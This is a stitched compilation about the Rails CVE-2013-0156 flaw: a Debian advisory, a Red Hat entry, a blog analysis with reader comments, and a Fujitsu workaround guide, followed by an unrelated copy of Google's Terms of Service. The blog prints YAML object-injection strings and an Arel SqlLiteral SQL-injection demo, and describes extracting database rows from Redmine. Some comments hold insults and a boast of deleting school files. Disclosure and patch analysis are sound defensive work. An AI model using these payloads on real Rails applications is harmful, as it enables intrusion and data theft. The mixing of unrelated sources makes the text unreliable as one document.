Debian Security Advisory DSA-2604-1                   security@debian.org
<http://www.debian.org/security/>                           Thijs Kinkhorst

- -------------------------------------------------------------------------

Package        : rails
Vulnerability  : insufficient input validation
Problem type   : remote
Debian-specific: no
CVE ID         : CVE-2013-0156
Debian Bug     : 697722

It was discovered that Rails, the Ruby web application development
framework, performed insufficient validation on input parameters,
allowing unintended type conversions. An attacker may use this to
bypass authentication systems, inject arbitrary SQL, inject and
execute arbitrary code, or perform a DoS attack on the application.

For the stable distribution (squeeze), this problem has been fixed in
version 2.3.5-1.2+squeeze4.1.

For the testing distribution (wheezy) and unstable distribution (sid),
this problem will be fixed soon.

We recommend that you upgrade your rails packages.

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be

# Does CVE-2013-0156 affect Red Hat products?

Solution Unverified
- Updated 2024-08-06T06:49:44+00:00 -
English

* No translations currently exist.

## Environment

* OpenShift Enterprise 1.0
* CloudForms 1.1
* Subscription Asset Manager 1.1

## Issue

* The flaw identified by [CVE-2013-0156](https://www.redhat.com/security/data/cve/CVE-2013-0156.html) (Red Hat Bugzilla [892870](https://bugzilla.redhat.com/show_bug.cgi?id=892870)) describes an issue in parameter parsing in Ruby on Rails. All Ruby on Rails applications are affected unless they have explicitly disabled XML parameter handling. This flaw could allow a remote attacker the ability to run arbitrary code in the context of the Ruby on Rails application.

## Resolution

##### OpenShift Enterprise 1.0

* An update to correct this issue is available, [RHSA-2013:0153](https://rhn.redhat.com/errata/RHSA-2013-0153.html)

##### CloudForms 1.1

* An update to correct this issue is available, [RHSA-2013:0155](https://rhn.redhat.com/errata/RHSA-2013-0155.html)

##### Subscription Asset Manager 1.1

* An update to correct this issue is available, [RHSA-2013:0154](https://rhn.redhat.com/errata/RHSA-2013-0154.html)

##### Workaround

* Updates to correct this issue are available for all affected Red Hat products. If you are unable to deploy updates an interim workaround is available.
* If your deployed Ruby on Rails applications do not rely on XML parameter support, then the best workaround is to disable it entirely. To do this, place the following snippet inside the application initializer:

  ActionDispatch::ParamsParser::DEFAULT\_PARSERS.delete(Mime::XML)
* If your deployed Ruby on Rails applications do rely on XML parameter support, a more complex workaround is

  possible. See the [upstream advisory](https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fgroups.google.com%2Fforum%2F%23%21topic%2Frubyonrails-security%2F61bkgvnSGTQ%2Fdiscussion) for more details.

## Root Cause

* The flaws, CVE-2013-0156, relate to the ability to specify POST parameters in XML format, which Ruby on Rails supports in addition to query string and JSON format.

# Analysis of Rails XML Parameter Parsing Vulnerability

This post tries to give an overview about the background and impact of the [new Rails XML parameter parsing vulnerability patched today](https://groups.google.com/forum/#!topic/rubyonrails-security/61bkgvnSGTQ/discussion).

## The bug

The root cause of the vulnerability is Rails handling of formatted parameters. In addition to standard GET and POST parameter formats, Rails can handle multiple different data encodings inside the body of POST requests. By default JSON and XML are supported. While support for JSON is widely used in production, the XML functionality does not seem to be known by many Rails developers.

### XML parameter parsing

The code responsible for parsing these different data types is shown below:

```
# actionpack/lib/action_dispatch/middleware/params_parser.rb
....
DEFAULT_PARSERS = {
      Mime::XML => : xml_simple,
      Mime::JSON => :json
    }
....
def parse_formatted_parameters(env)
        ...
        when Proc
          strategy.call(request.raw_post)
        when : xml_simple, : xml_node
          data = Hash.from_xml(request.raw_post) || {}
          data.with_indifferent_access
        when :yaml
          YAML.load(request.raw_post)
        when :json
          data = ActiveSupport::JSON.decode(request.raw_post)
          data = {:_json => data} unless data.is_a?(Hash)
          data.with_indifferent_access
        else
          false
        end
...
```

While the Proc and :yaml cases fortunately are not reachable by default and JSON is of minor importance, the XML case calls Hash.from\_xml() passing the raw POST body as argument. The code below is a simplified, showing only relevant parts of this code path.

```
def typecast_xml_value(value)
        case value.class.to_s
          when 'Hash'
            if value['type'] == 'array'
              ....
              ...
            elsif .. ||  (value["__content__"] &&
                 (value.keys.size == 1 ||value["__content__"].present?))
              content = value["__content__"]
              if parser = ActiveSupport::XmlMini::PARSING[value["type"]]
                parser.arity == 1 ? parser.call(content) : parser.call(content, value)
              else
                content
              end
            .....
            end
          when 'Array'
            value.map! { |i| typecast_xml_value(i) }
            value.length > 1 ? value : value.first
          when 'String'
            value
        end
      end
```
###

### Typed XML

As can be seen, the code supports the deserialization of XML trees into different datatypes. While basic types like Arrays, Strings and Hashs can be handled pretty easily, the XML parser includes additional support for several other types in order to allow code like the snippet below to be parsed correctly.

```
<?xml version="1.0" encoding="UTF-8"?>
<hash>
<foo type="integer">1</foo>
<bar type="float">1.3</bar>
</hash>
```

This typing support helps applications which do not want to implement their own date or integer parsing code. It is implemented using the “type” attribute and the following code line:

```
if parser = ActiveSupport::XmlMini::PARSING[value["type"]]
parser.arity == 1 ? parser.call(content) : parser.call(content, value)
```

Unfortunately ActiveSupport::XmlMini::PARSING not only includes harmless types like Integers or Floats, but also two special ones which have a critical security impact: **symbol** and **yaml**.

### Symbols and Rails

A Symbol is a special ruby type which normally gets created using the *:name* syntax. Symbols have several interesting properties which are out of the scope of this blogpost, but most importantly internal Rails functions rely on the assumption that no external user can inject symbols with malicious values. This assumption has already been attacked in several ways, most recently by [joernchen](http://phenoelit.org/blog/archives/2012/12/21/let_me_github_that_for_you/index.html) roughly one month ago in [CVE-2012-5664](https://groups.google.com/forum/?fromgroups=#!topic/rubyonrails-security/DCNTNp_qjFM). Even with the coressponding patch, more attack vectors using malicious symbols probably exist. For this bug the impact is reduced because the call to *data.with\_indifferent\_access* in parse\_formatted\_parameters transforms all Symbol keys in the hashtable to Strings which makes the exploitation of CVE-2012-5664 more difficult. However, the vector still exists and and exploitation might still be feasible.

In the end, the injection of symbols is a serious security issue. Still the second type “yaml” is even more interesting.

### YAML

YAML (YAML Ain’t Markup Language) is a data serialization format similar to JSON. Support for YAML inside XML is implemented using the following entry in ActiveSupport::XmlMini::Parsing:

```
"yaml" => Proc.new { |yaml| YAML::load(yaml) rescue yaml }
```

As you might remember YAML formatted parameters are not enabled by default in Rails due

to  YAML (or more specifically the YAML parsers  used by most scripting languages like e.g. Python or Ruby) not being designed to handle malicious user input. The YAML parser used by Ruby supports the serialization and deserialization of arbitrary data types. This includes Symbols (again!) and also arbitrary Objects.

The YAML string “”— !ruby/object:A\nfoo: 1\nbar: 1\n” will create an object instance of class A and set the object attributes @foo and @bar to the value 1. This means that an attacker can create instances of all classes defined in the targeted Rails application. This includes the basic ruby classes, all classes defined in the different activexy namespaces and even the ones used by lower level libraries like rack.  This opens a enormous attack surface as described in the next sections.

## Object Injection Attacks

So we have the ability to insert arbitary object instances as parameters into a running Rails application. What’s the impact? Let’s take a look at other web stacks:

### PHP

Object injection in PHP is possible using the unserialize() function

as described by [Stefan Esser in 2009](http://www.suspekt.org/downloads/POC2009-ShockingNewsInPHPExploitation.pdf). Thanks to “magic methods” like \_\_wakeup and \_\_destruct which get called

every time an object is deserialized or garbage collected, command execution is possible in most non trivial and current PHP applications, as demonstrated by bugs in [phpMyAdmin](http://www.phpmyadmin.net/home_page/security/PMASA-2010-3.php), [Typo3](http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2012-004/), [Piwik](http://www.suspekt.org/2009/12/09/advisory-032009-piwik-cookie-unserialize-vulnerability/) or [CakePHP](http://www.exploit-db.com/exploits/16011/).

### Java

A quite similar vulnerability was discovered by Johannes Dahse in the [Apache Struts2 web framework](http://websec.wordpress.com/2012/01/04/multiple-vulnerabilities-in-apache-struts2-and-property-oriented-programming-with-java/). Summarizing the very detailed blog post: Remote command execution is possible.

### Python

Finally, the pickle library used by python is easily attackable, because it includes class definitions in the serialized data format as demonstrated in this [blog post by Nelson Elhage](http://blog.nelhage.com/2011/03/exploiting-pickle/).

As these examples demonstrate object injection vulnerabilities can be exploited in many different ways. In the next section we show some potential attack vectors for Rails applications

## Exploitation in Rails

Let’s recap the abilities that an attacker obtains due to the described YAML injection: He can create an object instance of any class defined in the application. Furthermore he can set all instance variables to arbitrary values and is not restricted by validatios in the initialize or setter methods.

```
class B
  def initialize()
    @code = "puts 4"
  end
  def foo()
    eval @code
end
end
```

Imagine the (rather stupid) example class B above, if we are able to call the foo() method on a deserialized object we can execute arbitrary code. For example the YAML string **“— !ruby/object:B\ncode: puts 10\n”** results in the execution of *puts 10.*Of course, most real world applications do not have such simple exploitation vectors but thanks to the power of ruby, Rails becomes an easy target:

Ruby does have a dynamic type system and a rich support for operator overloading.  Missing type checks and the assumption that all user passed values are Strings,Array or Hashes open many exploitation vectors. While we do have discovered multiple classes and code paths that can be used to inject arbitrary code, we will not publish details about them till the majority of sites have applied the patch. Instead we demonstrate how object injection can be used to execute SQL injection attacks against Rails 3 application using [arel](https://github.com/rails/arel) objects.

arel allows the creation of complex SQL queries using familiar ruby syntax. An in depth discussion of arel is out of the scope of this post but arel objects have an interesting property when passed as argument to one of Rails dynamic finder methods (find\_by\_\*): The SQL code representing the arel object is directly copied into the SELECT statement created by the finder method, without applying any escaping:

```
irb(main):008:0> arel = Arel::Nodes::SqlLiteral.new("foo")
 => "foo"
irb(main):009:0> Blog.find_by_id(arel)
Blog Load (0.5ms) SELECT "blogs".* FROM "blogs" WHERE "blogs"."id" = foo LIMIT 1
SQLite3::SQLException: no such column: foo: SELECT "blogs".* FROM "blogs" WHERE "blogs"."id" = foo LIMIT 1

```

This is quite similiar to CVE-2012-5664 and would not be a problem under normal circumstances, but because we can create an Arel::Nodes::SqlLiteral object using YAML it becomes easily exploitable when a finder method is called like this:

```
XYZ.find_by_*(params[:x])

```

We can pass the string representing such an object as value of the x parameter inside a correctly formed XML post body. This will result in the creation of a SqlLiteral object and the injection of “SQLCODE” inside the executed SQL statement. We validated this attack against Rails 3.2.10 running the most recent version of the redmine project managment application and could extract arbitrary database entries as unauthenticated user. Note that the dynamic finder requirement is specific to this attack vector. Arbitrary code injection is still possible even when no dynamic finders are used.

## Summary

The discussed vulnerability is highly critical and allows code executions and SQL injections in all Rails applications that do not disable parsing of XML formatted parameters. Administrators should apply the published patch as soon as possible. If a timely update is not possible *ActionDispatch*::*ParamsParser*::*DEFAULT\_PARSERS*should be modified to remove XML support.

   So every production Rails app has a major security vulnerability and you published exploit code an hour after it was announced?

   You’re a compelete asshole.

      @hey:

      Sir (as you’re probably male),

      nice to meet you. Haven’t talked to such a gentle person for a long time. Really.

      So you seem to have a certain attitude as for handling vulnerability disclosure. We have another one, apparently.

      In addition you seem to have a certain way of addressing people, with not-so-nice words. Didn’t your mother tell you otherwise? Anyhow, again our way is a different one.

      Last you seem to stand for your beliefs in public, by providing your full name, to strengthen your statements. Congratulations! You made a difference today.

      Best

      Enno, erey@ernw.de

   真是死也要拉一个垫背的。乱用cPickle和eval也能算bug？

   If you trust data you pickle’d in Python, you are doing it WRONG.

   Great summary,

   unfortunately, the patches cause a serious regression, because every JSON incomming request containing nil values are now stripped.

    Enno, anyone has the right to be aggressive on this. He may very well be a Rails app owner that knows that his assets are wide open to threats now.

    From your side, being in favor of (somehow) full disclosure, you should be open to strict criticism as fierce it is. I also support full disclosure but I do understand people that don’t.

    Anyway, that was an excellent post.

    From what i’ve see here is that versions below 2.0 should not be affected by this issue as they do not support xml parameters and don’t have any XMLMini implementations.

    This is a really great write up.

    As for complaints about it coming up too soon, this exploit has already been announced and patched. How long do you want people to wait to discuss the ramifications of the exploit? This information is useful. I am quite sure people who are interested in exploiting this vulnerability don’t need a blog post explaining how the exploit works and what possible attack vectors are. People interested in that sort of thing usually know what’s up.

    Enno and Felix,

    I think your missing the point – while you’ll get a lot of traffic from this post, your actually doing more harm than good by posting precise code examples of the exploit.

    I echo Nathan Broadbent – you should pull this post and let it simmer for a few days while production sites protect themselves from the exploits.

    Thanks for the detailed analysis!

    It is way more helpful in avoiding similar issues in the future than the hand waving reports that are more typical for this type of issue.

    Ignore the WWW Potty-Mouth League. 😉

    Why is Python Pickle included in the list of comparitive web stacks? Pickle is a serialization format, not a web stack. Furthermore it says right at the top of the Pickle documentation in a scary red box:

    Warning

    The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.

    @erey,

    while the tone of the first commenter is absolutely counter-productive, he is right in saying that your post sheds too many details, too early, on how to exploit this critical Rails vulnerability.

    On the other hand, you saved me one hour of investigation while reaching for a proof-of-concept to test that the emergency fix I installed was really working — but you maybe also saved a bad guy, who’s never touched Ruby before, 8 hours of analysis before he is able to break into a production Rails webapp.

    This is the eternal fight between Full-Disclosure and the so-called “Responsible-Disclosure” – we’re not going to solve it today 🙂 but I hope that I helped you in understand the goods of the point that “@hey” has unsuccessfully tried to make.

    Cheers,

    ~Marcello (vjt)

    I think this coming too early, you don’t need to be a ruby ninga to pull down sites, please pull down this post and repost a week after.

    I got suspended from high school back in 99 for showing the IT admin that I had the ability to get into all networked storage devices through an apple exploit. I showed him so he would be impressed and show me how we both could fix it… I was such a nice boy. When I got back to school I paid that suspension forward by deleting and crashing as many files and services as possible. I then had to go before the district school board.

    The moral of the story: its ok to find problems, publish them! Then fix them! Bad stuff will happen but much much worse could happen if you try to demonize the people who find the exploits. Exploits are what make technology fun!

    This post does far more good than harm. Knowledge about a vulnerability AFTER it is widely known about is usually a good thing.

    Ignore those telling you to withhold detailed info relating to exploits. They are shortsighted.

    Individuals or groups with the resources & knowledge to do widespread or serious damage will unlikely be informed of such exploits via your site. Who gives a fuck about kiddies querying Google for a new Ruby exploit?

    If developers were more active in investigating & openly discussing vulnerabilities, a chaotic situation like this may have been preventable.

    Stick it, Ruby developers. It’s your own fault, retards.

    To put Enno’s points another way (hopefully usefully):

    1) If you really want to get someone who has no obligation to do what you say to do what you say, diplomacy and openness are your best bets. If you reject those routes, then it’s unlikely people will take your desire or ability to change their minds seriously.

    2) He’s pretty obviously smart enough to know what he’s doing and has his own opinion about it, so you’re going to need more than bluntly telling him he’s making a mistake to get him to change his mind.

    My own point:

    Someone who realizes (1) and (2) and doesn’t think they could get what they want even after putting in the work for it might resort to trying to piss someone off they disagree with by name-calling. It’s worth remembering that such people exist.

* In Windows
  + In case of Windows Server 2003: ![](/global/imagesgig5/space_tcm100-784899_tcm100-4850914-32.gif)
    1. Click "Start" button and select "Control Panel", then select "Add or Remove Programs".
    2. At "Add or Remove Programs" windows, check if one of the following software is installed.
       - >
       - Systemwalker Resource Coordinator Virtual server Edition Manager
       - ServerView Resource Coordinator VE Manager
       - ServerView Resource Orchestrator ManagerIf none of the above software appears on the list, the affected product is not installed, hence no need to proceed to the next step.
    3. Select the software at the previous step and Click the link "Click here for support information.". Then "Support Info" window will appear.
    4. At "Support Info" windows, check the "Version".

       If the installed version matches with one of the products listed at section "3-2", then the installed product contains the vulnerability.
  + In case of Windows Server 2008/ Windows Server 2012:
    1. Click "Start" button and select "Control Panel", then click "Program and Features".
    2. At "Program and Features" window, check if one of the following software is installed.
       - ServerView Resource Coordinator VE Manager
       - ServerView Resource Orchestrator ManagerIf none of the above software appears on the list, the affected product is not installed, hence no need to proceed to the next step.
    3. Select the software at the previous step and software info will be displayed at the bottom of "Program and Features" window.
    4. Check if the installed version matches with one of the products listed at section "3-2", then the installed product contains the vulnerability.
* In Linux
  1. Open a terminal
  2. Check if RCVE/ ROR is installed by executing the following command.

     #/bin/rpm -qi FJSVrcvmr
  3. Check "Version" info from the output of the command executed at the previous step.

     If the "Version" matches one of the products listed at section "3-2", then the installed product contains the vulnerability.

### 3-3. Workaround

* In Windows
  1. Login to SWRC-VE/ RCVE/ ROR manager server as Administrator or user account with admin privilege.
  2. Open Windows Explorer and move to the following directory.

     < SWRC-VE/ RCVE/ ROR installation path > \Manager\rails\config\initializers

     Note : < SWRC-VE/ RCVE/ ROR installation path > is the path to SWRC-VE/ RCVE/ ROR installation directory.
  3. Check if "CVE-2013-0156.rb" file exists or not.
     1. If "CVE-2013-0156.rb" file exists, then the workaround method has already been performed, hence no need to proceed to the next step.
     2. If "CVE-2013-0156.rb" file does not exist, create the file using text editor, and add the following 2 lines into the file.

        ActiveSupport::CoreExtensions::Hash::Conversions::XML\_PARSING.delete('symbol')

        ActiveSupport::CoreExtensions::Hash::Conversions::XML\_PARSING.delete('yaml')
  4. Open a command prompt and restart SWRC-VE/ RCVE/ ROR manager service by executing the following command.

     < SWRC-VE/ RCVE/ ROR Installation path >\SVROR\Manager\bin\rcxmgrctl stop

     < SWRC-VE /RCVE /ROR Installation path >\SVROR\Manager\bin\rcxmgrctl start
* In Linux
  1. Login to RCVE/ ROR manager server as root user.
  2. Open a terminal and change directory to /opt/FJSVrcvmr/rails/config/initializers/

     #cd /opt/FJSVrcvmr/rails/config/initializers/
  3. Check if "CVE-2013-0156.rb" file exists under the directory.

     #ls -l CVE-2013-0156.rb
     1. If the file exists, the workaround has already been performed. Hence no need to proceed to the next step.
     2. If the file does not exist, create CVE-2013-0156.rb and add the following 2 lines into the file.

        ActiveSupport::CoreExtensions::Hash::Conversions::XML\_PARSING.delete('symbol')

        ActiveSupport::CoreExtensions::Hash::Conversions::XML\_PARSING.delete('yaml')

        Below is an example of adding the 2 lines above using echo command.

        #echo "ActiveSupport::CoreExtensions::Hash::Conversions::XML\_PARSING.delete ('symbol')" &gt;&gt; CVE-2013-0156.rb

        #echo "ActiveSupport::CoreExtensions::Hash::Conversions::XML\_PARSING.delete('yaml')" &gt;&gt; CVE-2013-0156.rb
  4. Restart RCVE/ ROR manager service by executing the following command.

     #/opt/FJSVrcvmr/bin/rcxmgrctl stop

     #/opt/FJSVrcvmr/bin/rcxmgrctl startNote: Workaround method does not affect SWRC-VE/ RCVE/ ROR functionality.

# Google Terms of Service

Effective May 22, 2024 | [Archived versions](terms/archive?hl=en_US) | [Download PDF](https://www.gstatic.com/policies/terms/pdf/20240522/ks8shls0/google_terms_of_service_en_eu.pdf)

[Country version:](terms?hl=en_US#footnote-country-version) Ireland

## What’s covered in these terms

### We know it’s tempting to skip these Terms of Service, but it’s important to establish what you can expect from us as you use Google [services](terms?hl=en_US#footnote-services), and what we expect from you.

These Terms of Service reflect [the way Google’s business works](https://about.google/intl/en_IE/how-our-business-works), the laws that apply to our company, and [certain things we’ve always believed to be true](https://www.google.com/about/philosophy.html?hl=en_US). As a result, these Terms of Service help define Google’s relationship with you as you interact with our services. For example, these terms include the following topic headings:

* [What you can expect from us](terms?hl=en_US#toc-what-you-expect), which describes how we provide and develop our services
* [What we expect from you](terms?hl=en_US#toc-what-we-expect), which establishes certain rules for using our services
* [Content in Google services](terms?hl=en_US#toc-content), which describes the intellectual property rights to the content you find in our services — whether that content belongs to you, Google, or others
* [In case of problems or disagreements](terms?hl=en_US#toc-problems), which describes other legal rights you have, and what to expect in case someone violates these terms

Understanding these terms is important because, to use our services, you must accept these terms. We encourage you to download these terms for future reference. We make these terms, and all previous versions, available at all times [here](terms/archive?hl=en_US).

Besides these terms, we also publish a [Privacy Policy](privacy?hl=en_US). Although it’s not part of these terms, we encourage you to read it to better understand how you can [update, manage, export, and delete your information](https://myaccount.google.com/?hl=en_US).

# Terms

## Service provider

In the European Economic Area (EEA) and Switzerland, Google [services](terms?hl=en_US#footnote-services) are provided by, and you’re contracting with:

Google Ireland Limited
incorporated and operating under the laws of Ireland
(Registration Number: 368047 / VAT Number: IE6388047V)

Gordon House, Barrow Street
Dublin 4
Ireland

## Age requirements

If you’re under the [age required to manage your own Google Account](https://support.google.com/accounts/answer/1350409?hl=en_US), you must have your parent or legal guardian’s permission to use a Google Account. Please have your parent or legal guardian read these terms with you.

If you’re a parent or legal guardian, and you allow your child to use the [services](terms?hl=en_US#footnote-services), then these terms apply to you and you’re responsible for your child’s activity on the services.

Some Google services have additional age requirements as described in their [service-specific additional terms and policies](terms/service-specific?hl=en_US).

# Your relationship with Google

These terms help define the relationship between you and Google. When we speak of “Google,” “we,” “us,” and “our,” we mean Google Ireland Limited and its [affiliates](terms?hl=en_US#footnote-affiliates). Broadly speaking, we give you permission to access and use our [services](terms?hl=en_US#footnote-services) if you agree to follow these terms, which reflect [how Google’s business works and how we earn money](https://about.google/intl/en_IE/how-our-business-works).

## What you can expect from us

### Provide a broad range of useful services

![](https://www.gstatic.com/identity/boq/policies/privacy/tos_2024/03-provide-a-broad-range-of-useful-services-lightmode.svg)We provide a broad range of services that are subject to these terms, including:

* apps and sites (like Search and Maps)
* platforms (like Google Shopping)
* integrated services (like Maps embedded in other companies’ apps or sites)
* devices (like Google Nest and Pixel)

Many of these services also include content that you can stream or interact with.

Our services are designed to work together, making it easier for you to move from one activity to the next. For example, if your Calendar event includes an address, you can click on that address and Maps can show you how to get there.

### Develop, improve, and update Google services

![](https://www.gstatic.com/identity/boq/policies/privacy/tos_2024/04-develop-improve-and-update-google-services-lightmode.svg)

While we use a broad definition of “services” throughout these terms as described above, applicable law draws distinctions between “digital content”, “services”, and “goods” in certain situations. That’s why we use the more specific terms in this section and the [Legal guarantee](terms?hl=en_US#toc-legal-guarantee) section.

We’re constantly developing new technologies and features to improve our services. For example, we use artificial intelligence and machine learning to provide you with simultaneous translations, and to better detect and block spam and malware.

As part of the continual evolution of our digital content, services, and goods, we make modifications such as adding or removing features and functionalities, increasing or decreasing usage limits, and offering new digital content or services or discontinuing old ones. We may also change our digital content or services for these other reasons:

* to adapt to new technologies
* to reflect increases or decreases in the number of people who use a particular service
* to respond to key changes in the licenses and partnerships we have with others
* to prevent abuse or harm
* to address legal, regulatory, safety, or security issues

In particular, we sometimes make legally-required updates, which are modifications that keep digital content, services, or goods in conformity with the law. We make these updates to our digital content, services, and goods for safety or security reasons, and to make sure they meet the quality standards that you expect, such as those described in the [Legal guarantee](terms?hl=en_US#toc-legal-guarantee) section. We may automatically install updates that address significant safety or security risks. For other updates, you can choose whether you want them installed.

We maintain a rigorous product research program, so before we change or stop offering a service, we carefully consider your interests as a user, your reasonable expectations, and the potential impact on you and others. We only change or stop offering services for valid reasons.

If a modification negatively affects your ability to access or use our digital content or services, or if we stop offering a service all together, we’ll provide you with reasonable advance notice by email — including a description of the changes, when they’ll take place, and your right to end your contract with us if our modifications create more than a minor negative impact — except in urgent situations such as preventing abuse or harm, responding to legal requirements, or addressing security and operability issues. We’ll also provide you with an opportunity to export [your content](terms?hl=en_US#footnote-your-content) from your Google Account using [Google Takeout](https://takeout.google.com/settings/takeout?hl=en_US), subject to applicable law and policies.

## What we expect from you

### Follow these terms and service-specific additional terms

![](https://www.gstatic.com/identity/boq/policies/privacy/tos_2024/05-follow-these-terms-and-service-specific-additional-terms-lightmode.svg)The permission we give you to access and use our [services](terms?hl=en_US#footnote-services) continues as long as you comply with:

* **these terms**
* **[service-specific additional terms](terms/service-specific?hl=en_US)**, which could, for example, include things like additional age requirements

We also make various policies, help centers, and other resources available to you to answer common questions and to set expectations about using our services. These resources include our [Privacy Policy](privacy?hl=en_US), [Copyright Help Center](https://support.google.com/legal/topic/4558877?hl=en_US), [Safety Center](https://safety.google?hl=en_US), [Transparency Center](https://transparency.google/?hl=en_US), and other pages accessible from our [policies site](/?hl=en_US). Finally, we may provide specific instructions and warnings within our services – such as dialog boxes that alert you to important information.

Although we give you permission to use our services, we retain any [intellectual property rights](terms?hl=en_US#footnote-intellectual-property-rights) we have in the services.

### Respect others

![](https://www.gstatic.com/identity/boq/policies/privacy/tos_2024/06-respect-others-lightmode.svg)We want to maintain a respectful environment for everyone, which means you must follow these basic rules of conduct:

* comply with applicable laws, including export control, sanctions, and human trafficking laws
* respect the rights of others, including privacy and intellectual property rights
* don’t abuse or harm others or yourself (or threaten or encourage such abuse or harm) — for example, by misleading, defrauding, illegally impersonating, defaming, bullying, harassing, or stalking others

Our [service-specific additional terms and policies](terms/service-specific?hl=en_US), such as our [Generative AI Prohibited Use Policy](terms/generative-ai/use-policy?hl=en_US), provide additional details about appropriate conduct that everyone using those services must follow. If you find that others aren’t following these rules, many of our services allow you to [report abuse](https://support.google.com/groups/answer/81275?hl=en_US). If we act on a report of abuse, we also provide the process described in the *[Taking action in case of problems](terms?hl=en_US#taking-action)* section.

### Don’t abuse our services

Most people who access or use our services understand the general rules that keep the internet safe and open. Unfortunately, a small number of people don’t respect those rules, so we’re describing them here to protect our services and users from abuse. In that spirit:

You must not abuse, harm, interfere with, or disrupt our services or systems — for example, by:

* introducing malware
* spamming, hacking, or bypassing our systems or protective measures
* jailbreaking, adversarial prompting, or prompt injection, except as part of our [safety and bug testing programs](https://bughunters.google.com/?hl=en_US)
* accessing or using our services or content in fraudulent or deceptive ways, such as:

+ phishing
+ creating fake accounts or content, including fake reviews
+ misleading others into thinking that generative AI content was created by a human
+ providing services that appear to originate from you (or someone else) when they actually originate from us

* providing services that appear to originate from us when they do not
* using our services (including the content they provide) to violate anyone’s legal rights, such as intellectual property or privacy rights
* reverse engineering our services or underlying technology, such as our machine learning models, to extract trade secrets or other proprietary information, except as allowed by applicable law
* using automated means to access content from any of our services in violation of the machine-readable instructions on our web pages (for example, robots.txt files that disallow crawling, training, or other activities)
* using AI-generated content from our services to develop machine learning models or related AI technology
* hiding or misrepresenting who you are in order to violate these terms
* providing services that encourage others to violate these terms

### Permission to use your content

![](https://www.gstatic.com/identity/boq/policies/privacy/tos_2024/07-permission-to-use-your-content-lightmode.svg)

Some of our services are designed to let you upload, submit, store, send, receive, or share [your content](terms?hl=en_US#footnote-your-content). You have no obligation to provide any content to our services and you’re free to choose the content that you want to provide. If you choose to upload or share content, please make sure you have the necessary rights to do so and that the content is lawful.

## License

[Your content](terms?hl=en_US#footnote-your-content) remains yours, which means that you retain any [intellectual property rights](terms?hl=en_US#footnote-intellectual-property-rights) that you have in your content. For example, you have intellectual property rights in the creative content you make, such as reviews you write. Or you may have the right to share someone else’s creative content if they’ve given you their permission.

We need your permission if your intellectual property rights restrict our use of your content. You provide Google with that permission through this license.

### What’s covered

This license covers [your content](terms?hl=en_US#footnote-your-content) if that content is protected by intellectual property rights.

### What’s not covered

* This license doesn’t affect your data protection rights — it’s only about your intellectual property rights
* This license doesn’t cover these types of content:
  + publicly-available factual information that you provide, such as corrections to the address of a local business. That information doesn’t require a license because it’s considered common knowledge that everyone’s free to use.
  + feedback that you offer, such as suggestions to improve our services. Feedback is covered in the *[Service-related communications](terms?hl=en_US#toc-service-related-comm)* section below.

### Scope

This license is:

* worldwide, which means it’s valid anywhere in the world
* non-exclusive, which means you can license your content to others
* royalty-free, which means there are no monetary fees for this license
### Rights

This license allows Google to:

* host, reproduce, distribute, communicate, and use your content — for example, to save your content on our systems and make it accessible from anywhere you go
* publish, publicly perform, or publicly display your content, if you’ve made it visible to others
* modify your content, such as reformatting or translating it
* sublicense these rights to:
  + other users to allow the services to work as designed, such as enabling you to share photos with people you choose
  + our contractors who’ve signed agreements with us that are consistent with these terms, only for the limited purposes described in the *[Purpose](terms?hl=en_US#toc-purpose)* section below

### Purpose

This license is for the limited purpose of:

* **operating and improving the services**, which means allowing the services to work as designed and creating new features and functionalities. This includes using automated systems and algorithms to analyze your content:
  + for spam, malware, and illegal content
  + to recognize patterns in data, such as determining when to suggest a new album in Google Photos to keep related photos together
  + to customize our services for you, such as providing recommendations and personalized search results, content, and ads (which you can change or turn off in [Ads Settings](https://adssettings.google.com?ref=ps-terms&hl=en_US))This analysis occurs as the content is sent, received, and when it is stored.
* **using content you’ve shared publicly to promote the services**. For example, to promote a Google app, we might quote a review you wrote. Or to promote Google Play, we might show a screenshot of the app you offer in the Play Store.
* **developing new technologies and services** for Google consistent with these terms

### Duration

This license lasts for as long as your content is protected by intellectual property rights.

If you remove from our services any content that’s covered by this license, then our systems will stop making that content publicly available in a reasonable amount of time. There are two exceptions:

* If you already shared your content with others before removing it. For example, if you shared a photo with a friend who then made a copy of it, or shared it again, then that photo may continue to appear in your friend’s Google Account even after you remove it from your Google Account.
* If you make your content available through other companies’ services, it’s possible that search engines, including Google Search, will continue to find and display your content as part of their search results.

# Using Google services

## Your Google Account

[If you meet these age requirements](https://support.google.com/accounts/answer/1350409?hl=en_US) you can [create a Google Account](https://support.google.com/accounts/answer/27441?hl=en_US) for your convenience. Some [services](terms?hl=en_US#footnote-services) require that you have a Google Account in order to work — for example, to use Gmail, you need a Google Account so that you have a place to send and receive your email.

You’re responsible for what you do with your Google Account, including taking reasonable steps to keep your Google Account secure, and we encourage you to regularly use the [Security Checkup](https://myaccount.google.com/security-checkup?hl=en_US).

## Using Google services on behalf of an organization or business

Many [organizations](terms?hl=en_US#footnote-organization), such as businesses, non-profits, and schools, take advantage of our [services](terms?hl=en_US#footnote-services). To use our services on behalf of an organization:

* an authorized representative of that organization must agree to these terms
* your organization’s administrator may assign a Google Account to you. That administrator might require you to follow additional rules and may be able to access or disable your Google Account.
If you’re based in the European Union, then these terms don’t affect the rights you may have as a [business user](terms?hl=en_US#footnote-business-user) of online intermediation services — including online platforms such as Google Play — under the [EU Platform-to-Business Regulation](terms?hl=en_US#footnote-eu-platform-to-business).
## Service-related communications

To provide you with our services, we sometimes send you service announcements and other information. To learn more about how we communicate with you, see Google’s [Privacy Policy](privacy?hl=en_US).

If you choose to give us feedback, such as suggestions to improve our services, we may act on your feedback without obligation to you.

# Content in Google services

## Your content

Some of our [services](terms?hl=en_US#footnote-services) allow you to generate original content. Google won’t claim ownership over that content.

Some of our [services](terms?hl=en_US#footnote-services) give you the opportunity to make your content publicly available — for example, you might post a product or restaurant review that you wrote, or you might upload a blog post that you created.

* See the *[Permission to use your content](terms?hl=en_US#toc-permission)* section for more about your rights in [your content](terms?hl=en_US#footnote-your-content), and how your content is used in our services
* See the *[Removing your content](terms?hl=en_US#toc-removing)* section to learn why and how we might remove user-generated content from our services

